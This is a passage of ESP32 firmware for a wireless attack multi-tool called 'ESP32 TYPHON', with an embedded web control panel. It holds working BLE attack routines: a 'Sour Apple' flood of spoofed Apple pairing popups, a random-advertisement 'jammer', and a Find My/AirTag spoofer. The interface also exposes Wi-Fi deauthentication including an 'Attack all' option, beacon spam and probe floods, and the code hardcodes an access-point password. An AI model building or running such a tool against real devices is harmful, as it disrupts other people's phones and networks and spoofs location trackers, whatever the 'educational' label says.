    NimBLEDevice::getScan()->stop();
    bleScanning = false;
  }
}

static void sourUpdate() {
  if (!sourRunning) return;
  if (millis() - sourLast < 25) return;  // faster spam
  sourLast = millis();
  sourSent++;

  int idx = sourSelected;
  if (idx < 0 || idx >= APPLE_LIST_COUNT)
    idx = (int)(esp_random() % APPLE_LIST_COUNT);  // Random Mix
  const AppleType& t = appleList[idx];
  uint8_t mfg[31];
  int mfgLen = 0;

  if (t.isModel) {
    // Proximity pairing style packet
    mfg[0] = 0x4C; mfg[1] = 0x00;     // Apple
    mfg[2] = 0x07; mfg[3] = 0x19; mfg[4] = 0x07;
    mfg[5] = t.code; mfg[6] = t.code2;
    mfg[7] = 0x20; mfg[8] = 0x75; mfg[9] = 0xAA; mfg[10] = 0x30;
    mfg[11] = 0x01; mfg[12] = 0x00; mfg[13] = 0x00; mfg[14] = 0x45;
    for (int i = 15; i < 31; i++) mfg[i] = (uint8_t)(esp_random() & 0xFF);
    mfgLen = 31;
  } else {
    // Nearby action popup style
    mfg[0] = 0x4C; mfg[1] = 0x00;
    mfg[2] = 0x0F; mfg[3] = 0x05; mfg[4] = 0xC0;
    mfg[5] = t.code;
    mfg[6] = (uint8_t)(esp_random() & 0xFF);
    mfg[7] = (uint8_t)(esp_random() & 0xFF);
    mfg[8] = (uint8_t)(esp_random() & 0xFF);
    mfgLen = 9;
  }

  // Build full ADV: flags + manufacturer data
  // NimBLE setManufacturerData expects just company payload after company ID
  // We already include 4C 00 in mfg[0..1]
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData data;
  data.setFlags(0x06);
  // Manufacturer data without duplicating company ID for NimBLE:
  // NimBLE adds company ID separately in some versions; use raw-style via setManufacturerData
  // Pass full mfg including 4C00 – works on NimBLE-Arduino 1.4
  data.setManufacturerData(std::string((char*)mfg, mfgLen));
  adv->setAdvertisementData(data);
  adv->setMinInterval(16);
  adv->setMaxInterval(32);
  adv->start();
}

// ============================================================
//  BLE Jammer (rapid advertisement flood – educational)
// ============================================================
static bool jamRunning = false;
static uint32_t jamLast = 0;
static uint32_t jamCount = 0;

static void jamStart() {
  jamRunning = true;
  jamLast = 0;
  jamCount = 0;
  bleInit();
  if (bleScanning) {
    NimBLEDevice::getScan()->stop();
    bleScanning = false;
  }
  NimBLEDevice::getAdvertising()->stop();
}

static void jamStop() {
  if (!jamRunning) return;
  jamRunning = false;
  NimBLEDevice::getAdvertising()->stop();
}

static void jamUpdate() {
  if (!jamRunning) return;
  if (millis() - jamLast < 40) return;   // very fast
  jamLast = millis();
  jamCount++;

  // Random short advertisement to create noise
  uint8_t raw[10];
  for (int i = 0; i < 10; i++) raw[i] = (uint8_t)(esp_random() & 0xFF);

  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData data;
  data.setFlags(0x06);
  data.setManufacturerData(std::string((char*)raw, 10));
  char name[12];
  snprintf(name, sizeof(name), "J%lu", (unsigned long)(jamCount & 0xFFF));
  data.setName(name);
  adv->setAdvertisementData(data);
  adv->setMinInterval(16);
  adv->setMaxInterval(32);
  adv->start();
}

// ============================================================
//  AirTag Tools – Spoofer + simple finder
// ============================================================
static bool airTagRunning = false;
static uint32_t airTagLast = 0;
static uint32_t airTagSent = 0;
static int airTagMode = 0;   // 0 = select, 1 = spoof, 2 = sniff status

// Minimal Find-My style offline finding advertisement (educational)
static void airTagStart() {
  airTagRunning = false;
  airTagLast = 0;
  airTagSent = 0;
  airTagMode = 0;
  bleInit();
  NimBLEDevice::getAdvertising()->stop();
}

static void airTagStop() {
  if (!airTagRunning) return;
  airTagRunning = false;
  NimBLEDevice::getAdvertising()->stop();
}

static void airTagBeginSpoof() {
  airTagRunning = true;
  airTagMode = 1;
  airTagLast = 0;
  airTagSent = 0;
  if (bleScanning) {
    NimBLEDevice::getScan()->stop();
    bleScanning = false;
  }
}

static void airTagUpdate() {
  if (!airTagRunning || airTagMode != 1) return;
  if (millis() - airTagLast < 400) return;
  airTagLast = millis();
  airTagSent++;

  // Simplified Find My network payload (not a real AirTag key)
  // Company ID 0x004C, type 0x12 (Find My)
  uint8_t mfg[16];
  mfg[0] = 0x4C; mfg[1] = 0x00;
  mfg[2] = 0x12;                          // Find My
  mfg[3] = 0x19;                          // length-ish
  for (int i = 4; i < 16; i++) mfg[i] = (uint8_t)(esp_random() & 0xFF);

  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData data;
  data.setFlags(0x06);
  data.setManufacturerData(std::string((char*)mfg, 16));
  adv->setAdvertisementData(data);
  adv->setMinInterval(40);
  adv->setMaxInterval(80);
  adv->start();
}


// ============================================================
//  Soft-AP Web UI – full handlers (after all tools are defined)
// ============================================================
static const char WEB_PAGE[] PROGMEM = R"HTML(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>ESP32 TYPHON</title>
<style>
:root{--bg:#000000;--card:#0a0f0a;--line:#1a2e1a;--acc:#00ff66;--ok:#00ff66;--warn:#ffb020;--err:#ff3333;--fg:#ffffff;--dim:#7a9a7a;--r:14px}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--fg);min-height:100vh}
.top{position:sticky;top:0;z-index:20;background:rgba(7,11,16,.94);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);padding:12px 14px}
.brand{display:flex;align-items:center;justify-content:space-between;gap:10px}
.brand h1{font-size:1.05rem;color:var(--acc)}
.mode{font-size:.78rem;font-weight:700;letter-spacing:.04em;text-transform:uppercase;padding:6px 12px;border-radius:999px;border:1px solid var(--line)}
.mode.idle{background:#0a0a0a;color:var(--dim)}
.mode.scanning{background:#001a0a;color:var(--acc);border-color:#00aa44}
.mode.attacking{background:#1a0505;color:var(--err);border-color:#aa2222}
.mode.defending{background:#001a0a;color:var(--ok);border-color:#00aa44}
.stats{margin-top:8px;font-size:.78rem;color:var(--dim)}
.stats b{color:var(--fg)}
.wrap{max-width:720px;margin:0 auto;padding:14px}
.view{display:none}.view.active{display:block}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
@media(max-width:420px){.grid{grid-template-columns:1fr}}
.tile{background:linear-gradient(160deg,var(--card),#050805);border:1px solid var(--line);border-radius:var(--r);padding:18px 14px;cursor:pointer}
.tile:active{transform:scale(.98)}
.tile .ico{font-size:1.35rem;margin-bottom:8px}
.tile h2{font-size:.95rem;margin-bottom:4px}
.tile p{font-size:.75rem;color:var(--dim);line-height:1.35}
.card{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:14px;margin-bottom:12px}
.card h3{font-size:.9rem;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between;gap:8px}
.row{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px;align-items:center}
button{appearance:none;border:0;border-radius:10px;padding:12px 16px;font-size:.9rem;font-weight:600;cursor:pointer;background:var(--acc);color:#000}
button.sec{background:#111;color:var(--fg);border:1px solid var(--line)}
button.danger{background:var(--err);color:#fff}
button.on{background:var(--err);color:#fff}
button.attack{background:var(--err);color:#fff}
button:disabled{opacity:.45}
select,input{background:#050805;border:1px solid var(--line);color:var(--fg);border-radius:10px;padding:10px 12px;font-size:.88rem;width:100%}
#customSsidBox{display:none;margin-top:8px}
#customSsidBox.show{display:block}
.ssidRow{margin-bottom:6px}
label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
.list{margin-top:8px;max-height:320px;overflow:auto;border:1px solid var(--line);border-radius:10px}
.item{display:flex;justify-content:space-between;gap:8px;padding:10px 12px;border-bottom:1px solid var(--line);font-size:.82rem;align-items:flex-start}
.item:last-child{border-bottom:0}
.item .meta{color:var(--dim);font-size:.72rem;margin-top:2px}
.item.active{background:#15324a}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--ok);margin-right:6px;vertical-align:middle}
.rssi-g{color:#2ee59d}.rssi-y{color:#ffd84d}.rssi-o{color:#ffb020}.rssi-r{color:#ff5a6a}
.enc{font-size:.7rem;padding:2px 7px;border-radius:6px;background:#1a2736;color:var(--dim);margin-left:6px}
.nav{display:flex;gap:8px;align-items:center;margin-bottom:12px}
.back{background:transparent;color:var(--acc);border:1px solid var(--line);padding:8px 12px;font-size:.8rem}
.msg{min-height:1.1em;font-size:.78rem;color:var(--dim);margin-top:8px}
.footer{text-align:center;color:var(--dim);font-size:.72rem;padding:18px 8px 28px}
.bar{height:5px;background:#1a2736;border-radius:99px;overflow:hidden;margin-top:8px}
.bar>i{display:block;height:100%;width:0;background:var(--acc);transition:width .25s}
.stopall{width:100%;margin-top:12px}
</style>
</head>
<body>
<div class="top">
  <div class="brand">
    <h1>ESP32 TYPHON</h1>
    <span id="modePill" class="mode idle">Idle</span>
  </div>
  <div class="stats">Temp <b id="temp">—</b> °C</div>
</div>
<div class="wrap">

<div id="v-home" class="view active">
  <div class="grid">
    <div class="tile" onclick="go('wifi')"><div class="ico">📡</div><h2>Wi‑Fi Tools</h2><p>Scan, monitor, beacon, deauth, probe</p></div>
    <div class="tile" onclick="go('ble')"><div class="ico">🔵</div><h2>Bluetooth</h2><p>Scan, spoof, Sour Apple, jam, AirTag</p></div>
  </div>
  <button class="danger stopall" onclick="act('stop_all')">Stop all tools</button>
  <div class="msg" id="sysMsg"></div>
</div>

<div id="v-wifi" class="view">
  <div class="nav"><button class="back" onclick="go('home')">← Home</button><h2 style="font-size:1rem">Wi‑Fi Tools</h2></div>
  <div class="grid">
    <div class="tile" onclick="go('wifi-scan')"><div class="ico">🔍</div><h2>Scanner</h2><p>Nearby access points</p></div>
    <div class="tile" onclick="go('wifi-pm')"><div class="ico">📊</div><h2>Packet Monitor</h2><p>Channel activity</p></div>
    <div class="tile" onclick="go('wifi-beacon')"><div class="ico">📢</div><h2>Beacon Spam</h2><p>List or clone SSIDs</p></div>
    <div class="tile" onclick="go('wifi-deauth')"><div class="ico">⚡</div><h2>Deauth</h2><p>Target from scan</p></div>
    <div class="tile" onclick="go('wifi-det')"><div class="ico">🛡</div><h2>Deauth Detector</h2><p>Watch for attacks</p></div>
    <div class="tile" onclick="go('wifi-probe')"><div class="ico">📨</div><h2>Probe Flood</h2><p>Probe requests</p></div>
  </div>
  <button class="danger stopall" onclick="act('stop_all')">Stop all tools</button>
</div>

<div id="v-ble" class="view">
  <div class="nav"><button class="back" onclick="go('home')">← Home</button><h2 style="font-size:1rem">Bluetooth</h2></div>
  <div class="grid">
    <div class="tile" onclick="go('ble-scan')"><div class="ico">🔎</div><h2>BLE Scanner</h2><p>Nearby devices</p></div>
    <div class="tile" onclick="go('ble-sniff')"><div class="ico">👁</div><h2>BLE Sniffer</h2><p>Continuous scan</p></div>
    <div class="tile" onclick="go('ble-spoof')"><div class="ico">🎭</div><h2>BLE Spoofer</h2><p>Fake names</p></div>
    <div class="tile" onclick="go('ble-sour')"><div class="ico">🍎</div><h2>Sour Apple</h2><p>Pick model / action</p></div>
    <div class="tile" onclick="go('ble-jam')"><div class="ico">📻</div><h2>BLE Jammer</h2><p>Noise flood</p></div>
    <div class="tile" onclick="go('ble-air')"><div class="ico">🏷</div><h2>AirTag Spoof</h2><p>Find My style ADV</p></div>
  </div>
  <button class="danger stopall" onclick="act('stop_all')">Stop all tools</button>
</div>

<div id="v-wifi-scan" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Wi‑Fi Scanner</h2></div>
  <div class="card">
    <h3>Scanner</h3>
    <div class="row"><button id="btnWifiScan" onclick="act('wifi_scan')">Start scan</button></div>
    <div class="bar"><i id="wscanBar"></i></div>
    <div class="msg" id="wscanMsg">Previous results stay until a new scan finishes</div>
    <div class="list" id="wifiList"></div>
  </div>
</div>

<div id="v-wifi-pm" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Packet Monitor</h2></div>
  <div class="card">
    <h3>Monitor</h3>
    <label class="lbl">Channel (1–13)</label>
    <input type="number" id="pmCh" min="1" max="13" value="1">
    <div class="row"><button id="btnPm" onclick="toggle('pm')">Start</button></div>
    <div class="msg">Packets: <b id="pmTotal">0</b> · CH <b id="pmChLive">1</b></div>
  </div>
</div>

<div id="v-wifi-beacon" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Beacon Spammer</h2></div>
  <div class="card">
    <h3>Beacon</h3>
    <label class="lbl">Mode</label>
    <select id="beaconMode" onchange="onBeaconMode()">
      <option value="0">Funny SSID list</option>
      <option value="1">Clone scanned SSIDs</option>
      <option value="2">Add list of SSIDs</option>
    </select>
    <div id="customSsidBox">
      <label class="lbl">How many SSIDs (1–10)</label>
      <select id="ssidCount" onchange="buildSsidInputs()">
        <option>1</option><option>2</option><option>3</option><option>4</option><option>5</option>
        <option>6</option><option>7</option><option>8</option><option>9</option><option>10</option>
      </select>
      <div id="ssidInputs" style="margin-top:8px"></div>
    </div>
    <div class="row"><button id="btnBeacon" class="attack" onclick="toggle('beacon')">Start</button></div>
    <div class="msg">Sent: <b id="beaconSent">0</b></div>
  </div>
</div>

<div id="v-wifi-deauth" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Deauth Attack</h2></div>
  <div class="card">
    <h3>Target</h3>
    <div class="msg">Scan Wi‑Fi first, then tap a network</div>
    <div class="list" id="deauthList"></div>
    <div class="row">
      <button id="btnDeauth" class="attack" onclick="toggle('deauth')">Start</button>
      <button class="sec" onclick="act('deauth_start',{target:-1})">Attack all</button>
    </div>
    <div class="msg">Sent: <b id="deauthSent">0</b></div>
  </div>
</div>

<div id="v-wifi-det" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Deauth Detector</h2></div>
  <div class="card">
    <h3>Detector</h3>
    <div class="row"><button id="btnDet" onclick="toggle('det')">Start</button></div>
    <div class="msg">Detected frames: <b id="detCount">0</b></div>
  </div>
</div>

<div id="v-wifi-probe" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Probe Flood</h2></div>
  <div class="card">
    <h3>Probe</h3>
    <div class="row"><button id="btnProbe" class="attack" onclick="toggle('probe')">Start</button></div>
    <div class="msg">Sent: <b id="probeSent">0</b></div>
  </div>
</div>

<div id="v-ble-scan" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Scanner</h2></div>
  <div class="card">
    <h3>Scan</h3>
    <div class="row"><button id="btnBleScan" onclick="act('ble_scan')">Start scan</button></div>
    <div class="bar"><i id="bscanBar"></i></div>
    <div class="list" id="bleList"></div>
  </div>
</div>

<div id="v-ble-sniff" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Sniffer</h2></div>
  <div class="card">
    <h3>Sniffer</h3>
    <div class="row"><button id="btnSniff" onclick="toggle('sniff')">Start</button></div>
    <div class="list" id="bleList2"></div>
  </div>
</div>

<div id="v-ble-spoof" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Spoofer</h2></div>
  <div class="card">
    <h3>Advertise</h3>
    <label class="lbl">Mode</label>
    <select id="spoofMode">
      <option value="0">Rotating name list</option>
      <option value="1">Clone scanned BLE names</option>
      <option value="2">Custom name</option>
    </select>
    <label class="lbl">Custom name</label>
    <input id="spoofName" placeholder="My Device" maxlength="28">
    <div class="row"><button id="btnSpoof" class="attack" onclick="toggle('spoof')">Start</button></div>
  </div>
</div>

<div id="v-ble-sour" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">Sour Apple</h2></div>
  <div class="card">
    <h3>Model / Action</h3>
    <label class="lbl">Select what to advertise</label>
    <select id="sourIdx"><option value="-1">Random Mix</option></select>
    <div class="row"><button id="btnSour" class="attack" onclick="toggle('sour')">Start</button></div>
    <div class="msg">Sent: <b id="sourSent">0</b> · Active: <b id="sourName">—</b></div>
  </div>
</div>

<div id="v-ble-jam" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Jammer</h2></div>
  <div class="card">
    <h3>Noise</h3>
    <div class="row"><button id="btnJam" class="attack" onclick="toggle('jam')">Start</button></div>
    <div class="msg">Noise packets: <b id="jamCount">0</b></div>
  </div>
</div>

<div id="v-ble-air" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">AirTag Spoof</h2></div>
  <div class="card">
    <h3>Find My ADV</h3>
    <div class="row"><button id="btnAir" class="attack" onclick="toggle('air')">Start</button></div>
    <div class="msg">Sent: <b id="airSent">0</b></div>
  </div>
</div>

<div class="footer">Hold BOOT 2s to exit web mode · Educational use only</div>
</div>
<script>
let deauthTarget=-1, appleReady=false, S={};
function go(id){document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));const e=document.getElementById('v-'+id);if(e)e.classList.add('active');}
function onBeaconMode(){
  const m=document.getElementById('beaconMode').value;
  document.getElementById('customSsidBox').classList.toggle('show', m==='2');
  if(m==='2') buildSsidInputs();
}
function buildSsidInputs(){
  const n=parseInt(document.getElementById('ssidCount').value)||1;
  const box=document.getElementById('ssidInputs');
  let h='';
  for(let i=0;i<n;i++) h+=`<div class="ssidRow"><input id="ssid${i}" maxlength="32" placeholder="SSID ${i+1}"></div>`;
  box.innerHTML=h;
}
function esc(s){return String(s||'').replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));}
function rssiClass(r){if(r>=-55)return'rssi-g';if(r>=-70)return'rssi-y';if(r>=-80)return'rssi-o';return'rssi-r';}
function wifiItem(n,i,clickable){
  const open=!!n.open;
  const enc=esc(n.enc|| (open?'Open':'Secured'));
  const dot=open?'<span class="dot" title="Open network"></span>':'';
  const onclick=clickable?`onclick="pickDeauth(${i})"`:'';
  const active=(clickable&&deauthTarget===i)?' active':'';
  return `<div class="item${active}" ${onclick}>
    <div>${dot}<b>${esc(n.ssid)}</b><span class="enc">${enc}</span>
      <div class="meta">${esc(n.bssid||'')} · CH ${n.ch}</div></div>
    <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
}
function renderWifi(list){
  const empty='<div class="item"><span>No networks yet — run a scan</span></div>';
  if(!list||!list.length){document.getElementById('wifiList').innerHTML=empty;document.getElementById('deauthList').innerHTML=empty;return;}
  document.getElementById('wifiList').innerHTML=list.map((n,i)=>wifiItem(n,i,false)).join('');
  document.getElementById('deauthList').innerHTML=list.map((n,i)=>wifiItem(n,i,true)).join('');
}
function renderBle(list){
  const html=(!list||!list.length)?'<div class="item"><span>No devices yet — run a scan</span></div>':
    list.map(n=>`<div class="item"><div><b>${esc(n.name)}</b><div class="meta">${esc(n.addr||'')}</div></div><div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`).join('');
  document.getElementById('bleList').innerHTML=html;
  document.getElementById('bleList2').innerHTML=html;
}
function pickDeauth(i){deauthTarget=i;renderWifi(S.wifi||[]);}
function fillApple(names){if(appleReady||!names)return;const sel=document.getElementById('sourIdx');names.forEach((n,i)=>{const o=document.createElement('option');o.value=i;o.textContent=n;sel.appendChild(o);});appleReady=true;}
function setToggle(id,on){const b=document.getElementById(id);if(!b)return;b.textContent=on?'Stop':'Start';b.classList.toggle('on',!!on);}
function setMode(m){
  const el=document.getElementById('modePill');
  const map={idle:['Idle','idle'],scanning:['Scanning','scanning'],attacking:['Attacking','attacking'],defending:['Defending','defending']};
  const x=map[m]||map.idle; el.textContent=x[0]; el.className='mode '+x[1];
}
function apply(s){
  S=s||{};
  setMode(s.mode||'idle');
  document.getElementById('temp').textContent=(s.temp!=null)?Number(s.temp).toFixed(1):'—';
  setToggle('btnPm',s.pm); setToggle('btnBeacon',s.beacon); setToggle('btnDeauth',s.deauth);
  setToggle('btnDet',s.det); setToggle('btnProbe',s.probe); setToggle('btnSpoof',s.spoof);
  setToggle('btnSour',s.sour); setToggle('btnJam',s.jam); setToggle('btnAir',s.air); setToggle('btnSniff',s.sniff);
  document.getElementById('wscanBar').style.width=s.wifiScanning?'75%':'0%';
  document.getElementById('bscanBar').style.width=s.bleScanning?'75%':'0%';
  document.getElementById('btnWifiScan').textContent=s.wifiScanning?'Scanning…':'Start scan';
  document.getElementById('btnWifiScan').disabled=!!s.wifiScanning;
  document.getElementById('btnBleScan').textContent=s.bleScanning?'Scanning…':'Start scan';
  document.getElementById('btnBleScan').disabled=!!s.bleScanning;
  document.getElementById('pmTotal').textContent=s.pmTotal||0;
  document.getElementById('pmChLive').textContent=s.pmCh||1;
  document.getElementById('beaconSent').textContent=s.beaconSent||0;
  document.getElementById('deauthSent').textContent=s.deauthSent||0;
  document.getElementById('detCount').textContent=s.detCount||0;
  document.getElementById('probeSent').textContent=s.probeSent||0;
  document.getElementById('jamCount').textContent=s.jamCount||0;
  document.getElementById('airSent').textContent=s.airSent||0;
  document.getElementById('sourSent').textContent=s.sourSent||0;
  document.getElementById('sourName').textContent=s.sourName||'—';
  document.getElementById('wscanMsg').textContent=s.wifiScanning?'Scanning… keeping previous list until done':((s.wifi&&s.wifi.length)?(s.wifi.length+' networks'):'No networks yet');
  renderWifi(s.wifi); renderBle(s.ble); fillApple(s.apple);
}
async function refresh(){try{const r=await fetch('/api/status');apply(await r.json());}catch(e){}}
async function act(action,extra){
  const body=Object.assign({action},extra||{});
  if(action==='pm_start') body.ch=parseInt(document.getElementById('pmCh').value)||1;
  if(action==='beacon_start'){
    body.mode=parseInt(document.getElementById('beaconMode').value)||0;
    if(body.mode===2){
      const n=parseInt(document.getElementById('ssidCount').value)||1;
      const arr=[];
      for(let i=0;i<n;i++){const v=(document.getElementById('ssid'+i).value||'').trim(); if(v) arr.push(v);}
      body.list=arr.join('|');
      body.count=arr.length;
    }
  }
  if(action==='deauth_start' && body.target===undefined) body.target=deauthTarget;
  if(action==='spoof_start'){body.mode=parseInt(document.getElementById('spoofMode').value)||0;body.name=document.getElementById('spoofName').value||'';}
  if(action==='sour_start') body.idx=parseInt(document.getElementById('sourIdx').value);
  try{
    const r=await fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    const j=await r.json();
    document.getElementById('sysMsg').textContent=j.msg||'';
    if(j.status) apply(j.status);
  }catch(e){document.getElementById('sysMsg').textContent='Request failed — reconnect to ESP32-1';}
}
function toggle(tool){
  const on={pm:S.pm,beacon:S.beacon,deauth:S.deauth,det:S.det,probe:S.probe,spoof:S.spoof,sour:S.sour,jam:S.jam,air:S.air,sniff:S.sniff}[tool];
  if(on) act(tool+'_stop'); else act(tool+'_start');
}
setInterval(refresh,1500); refresh();
</script>
</body></html>
)HTML";


static float readChipTempC() {
  // Internal sensor; approximate, varies by chip/core version
  return temperatureRead();
}

static String jsonStatus() {
  String j = "{";
  bool any = pmRunning || beaconRunning || deauthRunning || detRunning ||
             probeRunning || sniffRunning || spoofRunning || sourRunning ||
             jamRunning || airTagRunning;
  const char* mode = "idle";
  if (wifiScanning || bleScanning || sniffRunning || pmRunning) mode = "scanning";
  else if (detRunning) mode = "defending";
  else if (beaconRunning || deauthRunning || probeRunning || spoofRunning ||
           sourRunning || jamRunning || airTagRunning) mode = "attacking";
  j += "\"mode\":\""; j += mode; j += "\",";
  j += "\"any\":"; j += any ? "true," : "false,";
  j += "\"pm\":"; j += pmRunning ? "true," : "false,";
  j += "\"beacon\":"; j += beaconRunning ? "true," : "false,";
  j += "\"deauth\":"; j += deauthRunning ? "true," : "false,";
  j += "\"det\":"; j += detRunning ? "true," : "false,";
  j += "\"probe\":"; j += probeRunning ? "true," : "false,";
  j += "\"spoof\":"; j += spoofRunning ? "true," : "false,";
  j += "\"sour\":"; j += sourRunning ? "true," : "false,";
  j += "\"jam\":"; j += jamRunning ? "true," : "false,";
  j += "\"air\":"; j += airTagRunning ? "true," : "false,";
  j += "\"sniff\":"; j += sniffRunning ? "true," : "false,";
  j += "\"wifiScanning\":"; j += wifiScanning ? "true," : "false,";
  j += "\"bleScanning\":"; j += bleScanning ? "true," : "false,";
  j += "\"pmTotal\":" + String((unsigned long)pktTotal) + ",";
  j += "\"pmCh\":" + String(pmChannel) + ",";
  j += "\"beaconSent\":" + String((unsigned long)beaconSent) + ",";
  j += "\"deauthSent\":" + String((unsigned long)deauthSent) + ",";
  j += "\"detCount\":" + String((unsigned long)deauthCount) + ",";
  j += "\"probeSent\":" + String((unsigned long)probeSent) + ",";
  j += "\"jamCount\":" + String((unsigned long)jamCount) + ",";
  j += "\"airSent\":" + String((unsigned long)airTagSent) + ",";
  j += "\"sourSent\":" + String((unsigned long)sourSent) + ",";
  j += "\"temp\":" + String(readChipTempC(), 1) + ",";
  j += "\"uptime\":" + String((unsigned long)millis()) + ",";
  j += "\"clients\":" + String((unsigned)WiFi.softAPgetStationNum()) + ",";
  j += "\"heap\":" + String((unsigned long)ESP.getFreeHeap()) + ",";
  {
    String sn = "—";
    if (sourRunning) {
      if (sourSelected < 0) sn = "Random Mix";
      else if (sourSelected < APPLE_LIST_COUNT) sn = appleList[sourSelected].name;
    }
    sn.replace("\"", "'");
    j += "\"sourName\":\"" + sn + "\",";
  }
  j += "\"apple\":[";
  for (int i = 0; i < APPLE_LIST_COUNT; i++) {
    if (i) j += ",";
    String n = appleList[i].name; n.replace("\"", "'");
    j += "\"" + n + "\"";
  }
  j += "],\"wifi\":[";
  for (int i = 0; i < wifiCount; i++) {
    if (i) j += ",";
    String s = wifiNets[i].ssid; s.replace("\"", "'");
    char bssid[18];
    snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
             wifiNets[i].bssid[0], wifiNets[i].bssid[1], wifiNets[i].bssid[2],
             wifiNets[i].bssid[3], wifiNets[i].bssid[4], wifiNets[i].bssid[5]);
    const char* encStr = "Open";
    switch (wifiNets[i].enc) {
      case WIFI_AUTH_OPEN: encStr = "Open"; break;
      case WIFI_AUTH_WEP: encStr = "WEP"; break;
      case WIFI_AUTH_WPA_PSK: encStr = "WPA"; break;
      case WIFI_AUTH_WPA2_PSK: encStr = "WPA2"; break;
      case WIFI_AUTH_WPA_WPA2_PSK: encStr = "WPA/WPA2"; break;
      case WIFI_AUTH_WPA2_ENTERPRISE: encStr = "WPA2-E"; break;
      case WIFI_AUTH_WPA3_PSK: encStr = "WPA3"; break;
      case WIFI_AUTH_WPA2_WPA3_PSK: encStr = "WPA2/WPA3"; break;
      default: encStr = "Secured"; break;
    }
    j += "{\"ssid\":\"" + s + "\",\"rssi\":" + String(wifiNets[i].rssi) +
         ",\"ch\":" + String(wifiNets[i].ch) + ",\"bssid\":\"" + String(bssid) +
         "\",\"enc\":\"" + String(encStr) + "\",\"open\":" +
         ((wifiNets[i].enc == WIFI_AUTH_OPEN) ? "true" : "false") + "}";
  }
  j += "],\"ble\":[";
  for (int i = 0; i < bleCount; i++) {
    if (i) j += ",";
    String n = bleDevs[i].name; n.replace("\"", "'");
    String a = bleDevs[i].addr; a.replace("\"", "'");
    j += "{\"name\":\"" + n + "\",\"addr\":\"" + a + "\",\"rssi\":" + String(bleDevs[i].rssi) + "}";
  }
  j += "]}";
  return j;
}

static void handleWebRoot() { webServer.send_P(200, "text/html", WEB_PAGE); }
static void handleWebStatus() { webServer.send(200, "application/json", jsonStatus()); }

static void handleWebApi() {
  String body = webServer.arg("plain");
  String action;
  int mode = 0, target = -1, ch = 1, idx = -1;
  String customName;

  int ai = body.indexOf("\"action\"");
  if (ai >= 0) {
    int q1 = body.indexOf('"', ai + 8);
    int q2 = body.indexOf('"', q1 + 1);
    if (q1 >= 0 && q2 > q1) action = body.substring(q1 + 1, q2);
  }
  auto parseIntAfter = [&](const char* key, int defv) -> int {
    int k = body.indexOf(key);
    if (k < 0) return defv;
    int c = k + (int)strlen(key);
    while (c < (int)body.length() && (body[c] < '0' || body[c] > '9') && body[c] != '-') c++;
    return (int)body.substring(c).toInt();
  };
  mode = parseIntAfter("\"mode\"", 0);
  target = parseIntAfter("\"target\"", -1);
  ch = parseIntAfter("\"ch\"", 1);
  idx = parseIntAfter("\"idx\"", -1);
  if (ch < 1 || ch > 13) ch = 1;
  {
    int ni = body.indexOf("\"name\"");
    if (ni >= 0) {
      int q1 = body.indexOf('"', ni + 6);
      int q2 = body.indexOf('"', q1 + 1);
      if (q1 >= 0 && q2 > q1) customName = body.substring(q1 + 1, q2);
    }
  }

  String msg = "OK";
  if (action == "stop_all") { stopAllTools(); msg = "All tools stopped"; }
  else if (action == "exit_web") { webExitRequested = true; msg = "Exiting web mode"; }
  else if (action == "wifi_scan") {
    if (webMode) {
      WiFi.mode(WIFI_AP_STA);
      WiFi.softAP("ESP32-1", "rgisking");
      delay(40);
    }
    wifiScanStart();
    msg = wifiScanning ? "Wi-Fi scan started" : "Scan failed to start";
  }
  else if (action == "pm_start") { stopAllTools(); pmChannel = ch; pmStart(); msg = "Packet monitor CH" + String(ch); }
  else if (action == "pm_stop") { pmStop(); msg = "PM stopped"; }
  else if (action == "beacon_start") {
    stopAllTools();
    beaconMode = (uint8_t)mode;
    if (beaconMode == 2) {
      customBeaconCount = 0;
      customBeaconIdx = 0;
      int li = body.indexOf("\"list\"");
      String listStr;
      if (li >= 0) {
        int q1 = body.indexOf('"', li + 6);
        int q2 = body.indexOf('"', q1 + 1);
        if (q1 >= 0 && q2 > q1) listStr = body.substring(q1 + 1, q2);
      }
